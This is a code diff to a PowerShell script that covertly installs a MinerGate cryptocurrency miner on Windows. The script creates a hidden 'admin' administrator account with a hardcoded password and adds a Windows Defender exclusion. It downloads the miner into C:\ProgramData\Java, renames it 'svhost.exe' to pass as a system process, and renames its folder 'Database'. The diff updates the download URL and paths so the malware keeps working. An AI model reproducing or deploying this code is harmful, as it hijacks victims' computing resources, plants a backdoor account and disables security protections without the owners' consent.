@@ -2,7 +2,7 @@ $Username = "admin"
 $Password = "Bigcooper1##"
 $group = "Administrators"
 $Arc = if ([System.IntPtr]::Size -eq 4) { "32-Bit" } else { "64-Bit" }
-$url = "https://minergate.com/download/win-cli"
+$url = "https://download.minergate.com/win-cli"
 $output = "C:\ProgramData\Java\Download.zip"
 $destination = "C:\ProgramData\Java"
 $start_time = Get-Date
@@ -41,8 +41,8 @@ Set-MpPreference -ExclusionProcess "svhost.exe"
  
 Invoke-WebRequest -Uri $url -OutFile $output
 Expand-Archive -path $output -destinationpath $destination
-Rename-Item C:\ProgramData\Java\MinerGate-cli-win64\Minergate-cli.exe svhost.exe
-Rename-Item C:\ProgramData\Java\MinerGate-cli-win64 C:\ProgramData\Java\Database
+Rename-Item C:\ProgramData\Java\MinerGate-cli-4.04-win64\Minergate-cli.exe svhost.exe
+Rename-Item C:\ProgramData\Java\MinerGate-cli-4.04-win64 C:\ProgramData\Java\Database
  
 cd C:\ProgramData\Java\Database
 "Taskkill /IM svhost.exe /F" | Out-File -encoding ascii jshalf.bat -append
